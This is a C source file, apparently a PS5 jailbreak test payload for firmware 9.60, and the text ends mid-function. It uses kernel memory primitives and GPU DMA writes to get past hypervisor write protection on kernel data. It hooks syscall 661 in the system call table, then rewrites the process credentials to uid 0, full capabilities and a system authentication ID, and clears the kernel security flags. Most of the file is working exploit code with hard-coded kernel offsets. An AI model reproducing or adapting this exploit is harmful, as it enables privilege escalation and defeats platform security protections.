/* hv-test v89 - cedsaill
 * ring0 via GPU DMA (bypass NPT/SLAT), no S3 required
 *
 * v76: cave_dmap=0 confirmed: GPU IOMMU blocks DMA-writes to ktext PA.
 *   PS5 HV protects ktext at TWO levels: CPU NPT (XO) AND GPU IOMMU (no DMA-write).
 *   Only kdata-level pages (e.g. sysent) allow GPU DMA writes -- ktext does not.
 *   Cannot use ktext+0x500 as shellcode cave via GPU DMA.
 * v77: Cave = user-space PROT_EXEC mmap page.
 *   onionHEN/kstuff disables SMEP -> kernel can call user-space VA in ring0.
 *   Shellcode written directly via memcpy (no GPU DMA for cave).
 *   GPU DMA still used for hook: writes cave_va (user-space) to sysent[4].sy_call.
 *   CLFLUSH user cave directly (our own page, no mirror needed).
 *   If SMEP still on: panic immediately at write() -> diagnose -> adjust.
 *
 * GPU DMA for hook (p2jb/lapse technique, FW 9.00-12.40):
 *   GPU RDNA2 IOMMU bypasses CPU NPT WP on kdata -> can DMA-write sysent page.
 *
 * All offsets for FW 9.60.
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <ps5/kernel.h>

extern int sceKernelAllocateMainDirectMemory(size_t, size_t, int, uint64_t *);
extern int sceKernelMapNamedDirectMemory(void **, size_t, int, int, uint64_t, size_t, const char *);

/* ---- config --------------------------------------------------------------- */
/* PC cible pour les logs TCP - remplacer par votre IP */
#define PC_IP    "192.168.1.100"
#define PC_PORT   9999

/* ---- FW 9.60 offsets ------------------------------------------------------ */
#define PAGERTAB_KDATA_OFF    0x00DE0420ULL  /* pagertab[] in kdata */
#define PGEROPS_ALLOC_OFF     0x18ULL        /* pgo_alloc slot in vm_pagerops */
#define KERNEL_PHYS_BASE      0x00900000ULL  /* PS5 ktext always loaded here (PA) */
#define KERNEL_CODE_CAVE_OFF  0x500ULL       /* dead-code cave at ktext+0x500 */

/* GPU kernel struct offsets (FW 9.05/9.60 alias) */
#define DATA_BASE_GVMSPACE    0x02D8A570ULL
#define SIZEOF_GVMSPACE       0x100ULL
#define GVMSPACE_PAGE_DIR_VA  0x38ULL
#define GVMSPACE_SIZE_OFF     0x10ULL
#define GVMSPACE_START_VA_OFF 0x08ULL
#define PROC_VM_SPACE_OFF     0x200ULL

/* ---- CPU PTE -------------------------------------------------------------- */
#define PTE_PA_MASK  0x000FFFFFFFFFF000ULL
#define PTE_P_BIT    (1ULL<<0)
#define PTE_PS_BIT   (1ULL<<7)

/* ---- GPU page-table ------------------------------------------------------- */
#define GPU_PDE_ADDR_MASK    0x0000FFFFFFFFFFC0ULL
#define GPU_PDE_VALID_BIT    0
#define GPU_PDE_IS_PTE_BIT   54
#define GPU_PDE_TF_BIT       56
#define GPU_PDE_BLOCK_FRAG_BIT 59

#define PROT_GPU_READ    0x10
#define PROT_GPU_WRITE   0x20
#define MAP_NO_COALESCE  0x400000

/* ---- GPU PM4 -------------------------------------------------------------- */
#define GPU_SUBMIT_IOCTL    0xC0108102
#define PM4_TYPE3           3
#define PM4_SHADER_COMPUTE  1
#define PM4_OPCODE_DMA_DATA 0x50
#define GPU_DMEM_SIZE       (2 * 0x100000ULL)

/* ---- TCP log -------------------------------------------------------------- */
static int g_sock = -1;
static void S(const char *s){ if(g_sock>=0) send(g_sock,s,strlen(s),MSG_NOSIGNAL); }
static void NL(void){ S("\n"); }
static void FL(void){ usleep(8000); }
static void X(uint64_t v){
    char b[19]; const char *h="0123456789abcdef";
    b[0]='0'; b[1]='x';
    for(int i=0;i<16;i++) b[2+i]=h[(v>>(60-i*4))&0xf];
    b[18]='\0'; S(b);
}

/* ---- kernel primitives ---------------------------------------------------- */
static int      kco(uint64_t va, void *buf, size_t n){ return kernel_copyout((intptr_t)va, buf, n); }
static int      kci(const void *buf, uint64_t va, size_t n){ return kernel_copyin(buf, (intptr_t)va, n); }
static uint64_t kread64(uint64_t va){ uint64_t v=0; kco(va,&v,8); return v; }
static uint32_t kread32(uint64_t va){ uint32_t v=0; kco(va,&v,4); return v; }
static void     kwrite64(uint64_t va, uint64_t v){ kci(&v, va, 8); }

/* Direct syscall 661 (unused slot on PS5 FW 9.60).
 * Unhooked: returns ENOSYS (0x4e raw in rax).
 * Hooked with xor-eax,eax;ret: returns 0 -> clear yes/no. */
static long do_sc661(void){
    long r;
    __asm__ volatile("movq $661,%%rax; syscall" : "=a"(r) :: "rcx","r11","memory");
    return r;
}

/* ---- globals -------------------------------------------------------------- */
static uint64_t g_cr3=0, g_dmap=0;

static int calc_dmap(void){
    intptr_t p = kernel_get_proc(getpid());
    if(!p) return -1;
    uint64_t vm=0;
    kco((uint64_t)p + KERNEL_OFFSET_PROC_P_VMSPACE, &vm, 8);
    if(!vm) return -1;
    uint64_t pm = vm + KERNEL_OFFSET_VMSPACE_VM_PMAP;
    uint64_t p4=0, cr3=0;
    kco(pm+0x20, &p4, 8); kco(pm+0x28, &cr3, 8);
    if(!cr3||(cr3&0xFFF)) return -1;
    g_cr3=cr3; g_dmap=p4-cr3;
    return 0;
}

/* Walk CPU page tables via process CR3. Safe for user VAs and kdata VAs.
 * Process PML4 maps kernel space too (FreeBSD, AMD = no KPTI). */
static uint64_t vtophys(uint64_t va){
    uint64_t t=g_cr3&PTE_PA_MASK;
    for(int lv=0;lv<4;lv++){
        uint64_t e=kread64(g_dmap+t+((va>>(39-lv*9))&0x1FF)*8);
        if(!(e&PTE_P_BIT)) return 0;
        if(lv==3) return (e&PTE_PA_MASK)|(va&0xFFF);
        if(lv==1&&(e&PTE_PS_BIT)) return (e&0x000FFFFFC0000000ULL)|(va&0x3FFFFFFF);
        if(lv==2&&(e&PTE_PS_BIT)) return (e&0x000FFFFFFFE00000ULL)|(va&0x1FFFFF);
        t=e&PTE_PA_MASK;
    }
    return 0;
}

/* Return DMAP address of the L4 (4K) PTE for `va` in the process page tables.
 * Used by mirror technique to remap user VA   ' sysent PA. */
static uint64_t find_pte_dmap(uint64_t va){
    uint64_t t=g_cr3&PTE_PA_MASK;
    for(int lv=0;lv<3;lv++){
        uint64_t e=kread64(g_dmap+t+((va>>(39-lv*9))&0x1FF)*8);
        if(!(e&PTE_P_BIT)) return 0;
        if((lv==1||lv==2)&&(e&PTE_PS_BIT)) return 0; /* huge/large page */
        t=e&PTE_PA_MASK;
    }
    return g_dmap+t+((va>>12)&0x1FFULL)*8;
}

/* ---- GPU helpers ---------------------------------------------------------- */

static inline uint64_t gpu_field(uint64_t e, int bit, uint64_t mask){
    return (e>>bit)&mask;
}

static uint32_t find_vmspace_vmid(void){
    intptr_t proc = kernel_get_proc(getpid());
    if(!proc) return 0;
    uint64_t vm=0;
    kco((uint64_t)proc + PROC_VM_SPACE_OFF, &vm, 8);
    if(!vm) return 0;
    for(int i=0; i<8; i++){
        uint32_t v = kread32(vm + 0x1D8 + (uint64_t)(i*4));
        if(v>0 && v<=0x10) return v;
    }
    return 0;
}

static uint64_t gpu_get_pdb2(uint32_t vmid){
    uint64_t gvs = (uint64_t)(uintptr_t)KERNEL_ADDRESS_DATA_BASE
                   + DATA_BASE_GVMSPACE + (uint64_t)vmid*SIZEOF_GVMSPACE;
    return kread64(gvs + GVMSPACE_PAGE_DIR_VA);
}

static uint64_t gpu_rel_va(uint32_t vmid, uint64_t va){
    uint64_t gvs = (uint64_t)(uintptr_t)KERNEL_ADDRESS_DATA_BASE
                   + DATA_BASE_GVMSPACE + (uint64_t)vmid*SIZEOF_GVMSPACE;
    uint64_t start = kread64(gvs + GVMSPACE_START_VA_OFF);
    uint64_t size  = kread64(gvs + GVMSPACE_SIZE_OFF);
    if(va>=start && va<start+size) return va-start;
    return (uint64_t)-1;
}

static uint64_t gpu_walk_pt(uint32_t vmid, uint64_t gpu_va, uint64_t *out_pgsz){
    uint64_t pdb2   = gpu_get_pdb2(vmid);
    uint64_t ml4i   = (gpu_va>>39)&0x1FF;
    uint64_t pdpi   = (gpu_va>>30)&0x1FF;
    uint64_t pdei   = (gpu_va>>21)&0x1FF;

    uint64_t ml4e = kread64(pdb2 + ml4i*8);
    if(gpu_field(ml4e,GPU_PDE_VALID_BIT,1)!=1) return 0;

    uint64_t pdpe_va = g_dmap+(ml4e&GPU_PDE_ADDR_MASK)+pdpi*8;
    uint64_t pdpe = kread64(pdpe_va);
    if(gpu_field(pdpe,GPU_PDE_VALID_BIT,1)!=1) return 0;

    uint64_t pde_va = g_dmap+(pdpe&GPU_PDE_ADDR_MASK)+pdei*8;
    uint64_t pde = kread64(pde_va);
    if(gpu_field(pde,GPU_PDE_VALID_BIT,1)!=1) return 0;

    if(gpu_field(pde,GPU_PDE_IS_PTE_BIT,1)==1){
        *out_pgsz=0x200000; return pde_va;
    }

    uint64_t frag   = gpu_field(pde,GPU_PDE_BLOCK_FRAG_BIT,0x1F);
    uint64_t offset = gpu_va&0x1FFFFF;
    uint64_t pt_pa  = pde&GPU_PDE_ADDR_MASK;
    uint64_t pte_va;

    if(frag==4){
        uint64_t pi = offset>>16;
        pte_va = g_dmap+pt_pa+pi*8;
        uint64_t pte = kread64(pte_va);
        if(gpu_field(pte,GPU_PDE_VALID_BIT,1)==1 && gpu_field(pte,GPU_PDE_TF_BIT,1)==1){
            pte_va = g_dmap+pt_pa+((gpu_va&0xFFFF)>>13)*8;
            *out_pgsz=0x2000;
        } else {
            *out_pgsz=0x10000;
        }
    } else if(frag==1){
        pte_va = g_dmap+pt_pa+((offset>>13)*8);
        *out_pgsz=0x2000;
    } else {
        pte_va = g_dmap+pt_pa+((offset>>16)*8);
        *out_pgsz=0x10000;
    }
    return pte_va;
}

static uint64_t gpu_alloc_dmem(uint64_t size, int gpu_write){
    uint64_t phys=0; void *va=NULL;
    int prot = PROT_READ|PROT_WRITE|PROT_GPU_READ;
    if(gpu_write) prot|=PROT_GPU_WRITE;
    if(sceKernelAllocateMainDirectMemory((size_t)size,(size_t)size,1,&phys)){ S("ERR:alloc\n"); return 0; }
    if(sceKernelMapNamedDirectMemory(&va,(size_t)size,prot,MAP_NO_COALESCE,phys,(size_t)size,"gpudma")){ S("ERR:map\n"); return 0; }
    return (uint64_t)(uintptr_t)va;
}

static int pm4_build_dma_data(uint32_t *pkt, uint64_t dst, uint64_t src, uint32_t len){
    uint32_t hdr = ((PM4_TYPE3&3u)<<30)|(((6-1)&0x3FFFu)<<16)|((PM4_OPCODE_DMA_DATA&0xFF)<<8)|((PM4_SHADER_COMPUTE&1)<<1);
    uint32_t dhdr = (1u<<31)|(2u<<25)|(1u<<27)|(2u<<13)|(1u<<15);
    pkt[0]=hdr; pkt[1]=dhdr;
    pkt[2]=(uint32_t)(src&0xFFFFFFFF); pkt[3]=(uint32_t)(src>>32);
    pkt[4]=(uint32_t)(dst&0xFFFFFFFF); pkt[5]=(uint32_t)(dst>>32);
    pkt[6]=len&0x1FFFFF;
    return 7*4;
}

struct {
    int fd;
    uint64_t victim_va, transfer_va, cmd_va;
    uint64_t victim_ptbe_va, victim_real_pa;
    uint64_t dmem_size;
} g_gpu = { .fd = -1 };

static int gpu_submit(uint64_t cmd_va, uint32_t bytes){
    uint64_t desc[2];
    uint32_t dwords = bytes>>2;
    desc[0] = ((cmd_va&0xFFFFFFFFULL)<<32)|0xC0023F00ULL;
    desc[1] = (((uint64_t)dwords&0xFFFFF)<<32)|((cmd_va>>32)&0xFFFF);
    uint64_t desc_va = g_gpu.cmd_va+0x1000;
    memcpy((void*)(uintptr_t)desc_va, desc, 16);
    struct { uint32_t pipe_id,count; uint64_t ptr; } sub;
    sub.pipe_id=0; sub.count=1; sub.ptr=desc_va;
    int r = ioctl(g_gpu.fd, GPU_SUBMIT_IOCTL, &sub);
    usleep(200000);
    return r;
}

/* Write `size` bytes from `buf` to physical address `pa` via GPU DMA.
 * Single atomic PTE write   " avoids intermediate state with PA=0. */
static int gpu_write_pa(uint64_t pa, const void *buf, uint32_t size){
    uint64_t trunc_pa = pa & ~(g_gpu.dmem_size-1);
    uint64_t offset   = pa - trunc_pa;
    if(offset+size > g_gpu.dmem_size){ S("ERR:range\n"); return -1; }

    int prot_ro = PROT_READ|PROT_WRITE|PROT_GPU_READ;
    int prot_rw = prot_ro|PROT_GPU_WRITE;

    memcpy((void*)(uintptr_t)g_gpu.transfer_va, buf, size);

    mprotect((void*)(uintptr_t)g_gpu.victim_va, (size_t)g_gpu.dmem_size, prot_ro);

    /* Atomic PTE repoint: keep all flags, replace only the address bits */
    uint64_t cur  = kread64(g_gpu.victim_ptbe_va);
    uint64_t flags = cur & ~GPU_PDE_ADDR_MASK;
    kwrite64(g_gpu.victim_ptbe_va, flags|(trunc_pa&GPU_PDE_ADDR_MASK));

    mprotect((void*)(uintptr_t)g_gpu.victim_va, (size_t)g_gpu.dmem_size, prot_rw);

    uint32_t pkt[7];
    int csz = pm4_build_dma_data(pkt, g_gpu.victim_va+offset, g_gpu.transfer_va, size);
    memcpy((void*)(uintptr_t)g_gpu.cmd_va, pkt, (size_t)csz);
    int r = gpu_submit(g_gpu.cmd_va, (uint32_t)csz);

    /* Restore original PA   " single atomic write */
    kwrite64(g_gpu.victim_ptbe_va, flags|(g_gpu.victim_real_pa&GPU_PDE_ADDR_MASK));
    return r;
}

static int gpu_init(void){
    g_gpu.dmem_size = GPU_DMEM_SIZE;
    g_gpu.fd = open("/dev/gc", O_RDWR);
    if(g_gpu.fd<0){ S("ERR:gc\n"); return -1; }
    S("gc_ok\n"); FL();

    g_gpu.victim_va   = gpu_alloc_dmem(GPU_DMEM_SIZE,1);
    g_gpu.transfer_va = gpu_alloc_dmem(GPU_DMEM_SIZE,1);
    g_gpu.cmd_va      = gpu_alloc_dmem(GPU_DMEM_SIZE,1);
    if(!g_gpu.victim_va||!g_gpu.transfer_va||!g_gpu.cmd_va){ S("ERR:dmem\n"); return -1; }
    S("dmem_ok\n"); FL();

    g_gpu.victim_real_pa = vtophys(g_gpu.victim_va);
    if(!g_gpu.victim_real_pa){ S("ERR:victim_pa\n"); return -1; }
    S("victim_pa="); X(g_gpu.victim_real_pa); NL(); FL();

    uint32_t vmid = find_vmspace_vmid();
    if(!vmid){ S("ERR:vmid\n"); return -1; }
    S("vmid="); X((uint64_t)vmid); NL(); FL();

    uint64_t rel = gpu_rel_va(vmid, g_gpu.victim_va);
    if(rel==(uint64_t)-1){ S("ERR:rel\n"); return -1; }
    S("rel="); X(rel); NL(); FL();

    uint64_t pgsz=0;
    g_gpu.victim_ptbe_va = gpu_walk_pt(vmid, rel, &pgsz);
    if(!g_gpu.victim_ptbe_va){ S("ERR:walk\n"); return -1; }
    S("ptbe_va="); X(g_gpu.victim_ptbe_va); S(" pgsz="); X(pgsz); NL(); FL();

    /* Capture PTE flags */
    mprotect((void*)(uintptr_t)g_gpu.victim_va,(size_t)GPU_DMEM_SIZE,PROT_READ|PROT_WRITE|PROT_GPU_READ);
    uint64_t ptbe = kread64(g_gpu.victim_ptbe_va);
    uint64_t cleared = ptbe & ~GPU_PDE_ADDR_MASK;
    S("ptbe="); X(ptbe); S(" clr="); X(cleared); NL(); FL();
    mprotect((void*)(uintptr_t)g_gpu.victim_va,(size_t)GPU_DMEM_SIZE,PROT_READ|PROT_WRITE|PROT_GPU_READ|PROT_GPU_WRITE);
    return 0;
}

/* ========================================================================== */
int main(void){
    g_sock = socket(AF_INET,SOCK_STREAM,0);
    if(g_sock<0) return 1;
    int one=1;
    setsockopt(g_sock,IPPROTO_TCP,TCP_NODELAY,&one,sizeof(one));
    struct sockaddr_in sa; memset(&sa,0,sizeof(sa));
    sa.sin_family=AF_INET;
    sa.sin_port=__builtin_bswap16(PC_PORT);
    sa.sin_addr.s_addr=inet_addr(PC_IP);
    if(connect(g_sock,(struct sockaddr*)&sa,sizeof(sa))<0){ close(g_sock); return 1; }

    S("=== hv-test v89 ===\n"); FL();

    /* 1. CPU primitives */
    if(calc_dmap()){ S("ERR:dmap\n"); FL(); goto done; }
    S("dmap="); X(g_dmap); NL(); FL();

    uint64_t kbase   = (uint64_t)(uintptr_t)KERNEL_ADDRESS_TEXT_BASE;
    uint64_t kdata_v = (uint64_t)(uintptr_t)KERNEL_ADDRESS_DATA_BASE;
    S("kbase="); X(kbase); S(" kdata="); X(kdata_v); NL(); FL();

    /* 2. Args page (user) for ring0 flag   " vtophys on USER VA is safe */
    void *ap = mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if(ap==MAP_FAILED){ S("ERR:mmap_ap\n"); FL(); goto done; }
    memset(ap,0,0x1000);
    uint64_t pa_ap     = vtophys((uint64_t)(uintptr_t)ap);
    uint64_t flag_dmap = g_dmap + pa_ap + 0x18;
    S("flag_dmap="); X(flag_dmap); NL(); FL();
    kwrite64(flag_dmap, 0xCAFEFACEULL);
    if(*(volatile uint32_t*)((uint8_t*)ap+0x18) != 0xCAFEFACEUL)
        { S("ERR:flag_rw\n"); FL(); goto done; }
    kwrite64(flag_dmap, 0ULL);
    S("flag_rw_ok\n"); FL();

    /* 3. Sysent scan   " PS5 struct sysent: n_arg@0x00(u32), pad@0x04, sy_call@0x08(u64), stride=0x30.
     *    Step 1: 10 consecutive entries each with sy_call (@+0x08) in [kbase, kdata).
     *    Step 2: n_arg (@+0x00, uint32) signature [0,1,0,3,3] for sysent[0..4]
     *            (nosys=0, exit=1, fork=0, read=3, write=3). */
    S("sysent_scan...\n"); FL();
    uint64_t sysent_va      = 0;
    uint64_t sys_write_orig = 0;
    {
        uint64_t cands[5]; int nc=0;
        for(uint64_t off=0; off<0x2000000ULL; off+=8){
            int ok=1;
            for(int i=0;i<10;i++){
                uint64_t sc=kread64(kdata_v+off+(uint64_t)i*0x30+0x08);
                if(sc<kbase||sc>=kdata_v){ ok=0; break; }
            }
            if(!ok) continue;
            uint32_t n0=0,n1=0,n2=0,n3=0,n4=0;
            kco(kdata_v+off+0*0x30,&n0,4);
            kco(kdata_v+off+1*0x30,&n1,4);
            kco(kdata_v+off+2*0x30,&n2,4);
            kco(kdata_v+off+3*0x30,&n3,4);
            kco(kdata_v+off+4*0x30,&n4,4);
            if(n0!=0||n1!=1||n2!=0||n3!=3||n4!=3) continue;
            uint64_t cva = kdata_v+off;
            uint64_t cwr = kread64(cva+4*0x30+0x08);
            S("C"); X((uint64_t)nc); S("="); X(cva); S(" wr="); X(cwr); NL(); FL();
            if(nc<5) cands[nc]=cva;
            nc++;
            if(nc>=5) break;
            off += 0xFFF8; /* smart-skip: net +0x10000 past this table */
        }
        if(!nc){ S("ERR:sysent\n"); FL(); goto done; }
        sysent_va = cands[nc-1]; /* LAST = native PS5 sysent */
        S("using="); X(sysent_va); S(" nc="); X((uint64_t)nc); NL(); FL();
    }

    /* sy_call of sysent[4] (sys_write) is at sysent_va + 4*0x30 + 0x08 */
    uint64_t sysent4_sc = sysent_va + 4*0x30 + 0x08;
    sys_write_orig = kread64(sysent4_sc);
    if(sys_write_orig<kbase||sys_write_orig>=kdata_v)
        { S("ERR:write_orig\n"); X(sys_write_orig); NL(); FL(); goto done; }
    S("write_orig="); X(sys_write_orig); NL(); FL();
    S("sysent_ok\n"); FL();

    /* 4. Shellcode: xor eax,eax; ret  (returns 0 = success).
     * Hook fires: do_sc661() raw-rax = 0.
     * No hook:    do_sc661() raw-rax = 0x4e (ENOSYS from nosys). */
    uint8_t sc[30];
    sc[0]=0x31; sc[1]=0xc0; /* xor eax,eax */
    sc[2]=0xc3;             /* ret */
    memset(sc+3, 0x90, 27);
    S("sc_ok\n"); FL();

    /* 5. Cave = table PS4 entry 661 dans kdata (adresse kernel, SMEP-safe).
     *    Le shellcode sera ecrit dans kdata via GPU DMA en section 9. */
    uint64_t sc_word = *(const uint64_t*)sc;
    S("sc0="); X(sc_word); NL(); FL();

    /* 6. GPU DMA init */
    S("gpu_init...\n"); FL();
    if(gpu_init()){ S("ERR:gpu_init\n"); FL(); goto done; }
    S("gpu_rdy\n"); FL();

    /* 9. v82: Walk allproc -> our proc -> scan for p_sysent -> hook sv_table[661].
     *
     * v81 root cause confirmed: scanned sysent had post_ev=cave_va but wret=2.
     * write() dispatch does NOT read from our scanned sysent_va.
     * Hypothesis: scanned sysent = PS4-compat table; our PS5-native process uses
     * the PPR (PS5-native) sysent, found via p->p_sysent->sv_table.
     *
     * v82 fix: walk allproc (kbase+0x033F5D50 per Relapse 9.60) to find our
     * proc, scan proc struct for a valid sysentvec pointer (p_sysent), read
     * sv_table from it, hook sv_table[661].sy_call (unused slot, poops approach).
     * Trigger: raw syscall 661 -> returns 0 if hook fires, 0x4e (ENOSYS) if not. */

    /* --- 9a. Walk allproc --- */
    uint64_t allproc_va = kbase + 0x033F5D50ULL;
    S("allproc_va="); X(allproc_va); NL(); FL();
    uint64_t my_proc = 0;
    {
        int mypid = getpid();
        uint64_t pp = kread64(allproc_va);  /* LIST_HEAD lh_first */
        S("proc0="); X(pp); NL(); FL();
        int it = 0;
        while(pp && (pp>>48)==0xffffULL && it<512) {
            uint32_t pid=0; kco(pp+0x0bc,&pid,4);
            if((int)pid==mypid){ my_proc=pp; break; }
            pp=kread64(pp);  /* p_list.le_next at offset 0 */
            it++;
        }
        S("iters="); X((uint64_t)it); NL(); FL();
    }
    if(!my_proc){ S("ERR:no_proc\n"); FL(); goto done; }
    S("my_proc="); X(my_proc); NL(); FL();

    /* --- 9b. Scan proc struct for p_sysent (pointer to valid sysentvec) --- */
    /* sysentvec: sv_size(int@0)=[300..1000], sv_table(ptr@8)=kernel VA.
     * Also validate n_arg[0]=0, n_arg[1]=1 at sv_table. */
    uint64_t real_sv_table = 0;
    {
        for(uint64_t off=0x100; off<0x1400; off+=8){
            uint64_t v = kread64(my_proc+off);
            if((v>>40) != 0xffffffULL) continue;
            uint32_t sv_sz=0; kco(v,&sv_sz,4);
            if(sv_sz<300||sv_sz>1000) continue;
            uint64_t sv_tb = kread64(v+8);
            if((sv_tb>>40) != 0xffffffULL) continue;
            /* validate sysent[0].n_arg=0, sysent[1].n_arg=1 */
            uint32_t n0=0,n1=0;
            kco(sv_tb+0*0x30,&n0,4);
            kco(sv_tb+1*0x30,&n1,4);
            if(n0!=0||n1!=1) continue;
            S("psy="); X(off); S(" sz="); X((uint64_t)sv_sz);
            S(" sv_tb="); X(sv_tb); NL(); FL();
            if(!real_sv_table) real_sv_table=sv_tb;
        }
    }
    if(!real_sv_table){ S("ERR:no_sv\n"); FL(); goto done; }
    S("scanned_sysent="); X(sysent_va); NL(); FL();
    S("real_sv_table="); X(real_sv_table); NL(); FL();
    S("same="); X((uint64_t)(real_sv_table==sysent_va)); NL(); FL();

    /* --- 9c. Gadget: sys_sync (ktext, retourne 0) lu depuis real_sv_table[36].
     *    ktext est XO (non-lisible par kco), mais son adresse est lisible dans kdata.
     *    sys_sync() retourne 0 -> wret=0 -> hook confirme via effet observable. */
    uint64_t gadget_va = kread64(real_sv_table + 36*0x30 + 0x08);
    S("gadget_va="); X(gadget_va); NL(); FL();
    if(gadget_va<kbase||gadget_va>=kdata_v)
        { S("ERR:gadget_va\n"); FL(); goto done; }

    /* --- 9d. Hook: sysent[661].sy_call -> gadget_va (ktext) --- */
    uint64_t sc661_real    = kread64(real_sv_table + 661*0x30+0x08);
    S("sc661_real="); X(sc661_real); NL(); FL();

    uint64_t hook661_va = real_sv_table + 661*0x30+0x08;
    uint64_t hook661_orig = sc661_real;
    if(hook661_orig<kbase||hook661_orig>=kdata_v)
        { S("ERR:661_orig\n"); FL(); goto done; }

    uint64_t hook661_pg_pa = vtophys(hook661_va & ~0xFFFULL);
    if(!hook661_pg_pa){ S("ERR:h661_vtop\n"); FL(); goto done; }
    uint64_t hook661_pa = hook661_pg_pa + (hook661_va & 0xFFFULL);
    S("hook661_pa="); X(hook661_pa); NL(); FL();
    S("pre661="); X(kread64(g_dmap + hook661_pa)); NL(); FL();

    /* GPU DMA: write gadget_va (ktext) to hook661_pa */
    if(gpu_write_pa(hook661_pa, &gadget_va, 8)){ S("ERR:gpu661\n"); FL(); goto done; }
    S("dmap661="); X(kread64(g_dmap + hook661_pa)); NL(); FL();

    /* Cache pressure: 32 MB WB scan evicts all L3 sets */
    {
        const size_t EV_SZ = 32U * 1024U * 1024U;
        volatile char *ev = (volatile char *)mmap(NULL, EV_SZ,
                                PROT_READ|PROT_WRITE,
                                MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        if(ev != MAP_FAILED) {
            for(size_t i = 0; i < EV_SZ; i += 0x1000) ev[i] = (char)i;
            volatile uint64_t ev_sum = 0;
            for(size_t i = 0; i < EV_SZ; i += 64)
                ev_sum += *(volatile uint64_t *)(ev + i);
            (void)ev_sum;
            munmap((void *)ev, EV_SZ);
        }
    }
    S("evicted\n"); FL();
    S("post661="); X(kread64(hook661_va)); NL(); FL();

    /* Trigger: raw syscall 661.
     * Returns 0 if hook fired (xor eax,eax; ret).
     * Returns 0x4e (ENOSYS) if nosys (hook not fired). */
    long wret = do_sc661();
    S("wret="); X((uint64_t)(unsigned long)wret); NL(); FL();
    S("triggered\n"); FL();

    /* Restore: GPU DMA original value back to hook661_pa. */
    S("r1\n"); FL(); gpu_write_pa(hook661_pa, &hook661_orig, 8);
    S("restored\n"); FL();

    /* 10. Ring0 check: wret=0 means hook fired (xor eax,eax ret returned 0).
     *                  wret=0x4e means nosys (hook did not fire). */
    if(wret==0) S("*** RING0_OK *** (wret=0)\n");
    else { S("ring0 did not fire wret="); X((uint64_t)(unsigned long)wret); NL(); }
    FL();

    /* 11. Jailbreak: modifier ucred (uid=0, caps=max) + security_flags=0
     *     via GPU DMA (bypass NPT WP pour kdata).
     *     On n'a pas besoin de ring0 shellcode : GPU DMA ecrit directement en kdata.
     *
     *     ucred offsets (FW 9.60, confirmes par Relapse) :
     *       +0x04 cr_uid, +0x08 cr_ruid, +0x0c cr_svuid, +0x10 cr_ngroups
     *       +0x14 cr_rgid, +0x18 cr_svgid
     *       +0x58 sceAuthId, +0x60 sceCaps[0], +0x68 sceCaps[1], +0x80 sceAttrs[0]
     *     security_flags = kbase + 0x1a13064 (u32)
     */
    S("=== jailbreak ===\n"); FL();

    uint64_t ucred_va = kread64(my_proc + 0x040ULL);
    S("ucred_va="); X(ucred_va); NL(); FL();
    if((ucred_va>>48) != 0xffffULL){ S("ERR:ucred_va\n"); FL(); goto done; }

    /* uid(+0x04, u32) | ruid(+0x08, u32) = 0 en un seul write 8 bytes
     * adresse +0x04 = 4-byte aligned -> DMA ok */
    {
        uint64_t qw = kread64(ucred_va + 0x04ULL);
        S("uid_ruid_b="); X(qw); NL(); FL();
        uint64_t zero64 = 0;
        gpu_write_pa(vtophys(ucred_va + 0x04ULL), &zero64, 8);
    }

    /* svuid(+0x0c, u32) → 0 ; ngroups(+0x10, u32) garde sa valeur */
    {
        uint64_t qw = kread64(ucred_va + 0x0cULL);
        S("svuid_ng_b="); X(qw); NL(); FL();
        qw &= 0xFFFFFFFF00000000ULL; /* clear svuid (bits 0..31), keep ngroups */
        gpu_write_pa(vtophys(ucred_va + 0x0cULL), &qw, 8);
    }

    /* rgid(+0x14, u32) | svgid(+0x18, u32) = 0 */
    {
        uint64_t zero64 = 0;
        gpu_write_pa(vtophys(ucred_va + 0x14ULL), &zero64, 8);
    }

    /* sceAuthId = 0x4800000000000007 (system core authid) */
    {
        uint64_t authid = 0x4800000000000007ULL;
        gpu_write_pa(vtophys(ucred_va + 0x58ULL), &authid, 8);
    }

    /* sceCaps[0] = sceCaps[1] = 0xFFFFFFFFFFFFFFFF */
    {
        uint64_t caps = 0xFFFFFFFFFFFFFFFFULL;
        gpu_write_pa(vtophys(ucred_va + 0x60ULL), &caps, 8);
        gpu_write_pa(vtophys(ucred_va + 0x68ULL), &caps, 8);
    }

    /* sceAttrs[0] = 0xFFFFFFFFFFFFFFFF */
    {
        uint64_t attrs = 0xFFFFFFFFFFFFFFFFULL;
        gpu_write_pa(vtophys(ucred_va + 0x80ULL), &attrs, 8);
    }

    /* security_flags (u32 @ kbase+0x1a13064).
     * +0x1a13064 % 8 = 4 -> non-8-aligned : lire qword @ kbase+0x1a13060,
     * clear bits 32..63 (= security_flags @ +4), reecrire 8 bytes. */
    {
        uint64_t sf_va = kbase + 0x1a13060ULL;
        uint64_t sf_qw = kread64(sf_va);
        S("secflg_b="); X(sf_qw); NL(); FL();
        sf_qw &= 0x00000000FFFFFFFFULL; /* clear security_flags dans les bits 32..63 */
        gpu_write_pa(vtophys(sf_va), &sf_qw, 8);
    }

    /* Cache eviction 32MB : flush L2/L3 pour invalider les vieilles valeurs CPU */
    {
        const size_t EV2_SZ = 32U * 1024U * 1024U;
        volatile char *ev2 = (volatile char *)mmap(NULL, EV2_SZ,
                                PROT_READ|PROT_WRITE,
                                MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        if(ev2 != MAP_FAILED) {
            for(size_t i = 0; i < EV2_SZ; i += 0x1000) ev2[i] = (char)i;
            volatile uint64_t ev2_sum = 0;
            for(size_t i = 0; i < EV2_SZ; i += 64)
                ev2_sum += *(volatile uint64_t *)(ev2 + i);
            (void)ev2_sum;
            munmap((void *)ev2, EV2_SZ);
        }
    }
    S("evict2_ok\n"); FL();

    /* Verification : lire uid via DMAP (RAM physique) et via getuid() (syscall) */
    {
        uint64_t uid_dmap = kread64(ucred_va + 0x04ULL);
        S("uid_after_dmap="); X(uid_dmap); NL(); FL();
        uint64_t auth_dmap = kread64(ucred_va + 0x58ULL);
        S("auth_after="); X(auth_dmap); NL(); FL();
        /* getuid() = syscall qui lit p->p_ucred->cr_uid dans le kernel */
        int suid = (int)getuid();
        S("getuid="); X((uint64_t)(unsigned)suid); NL(); FL();
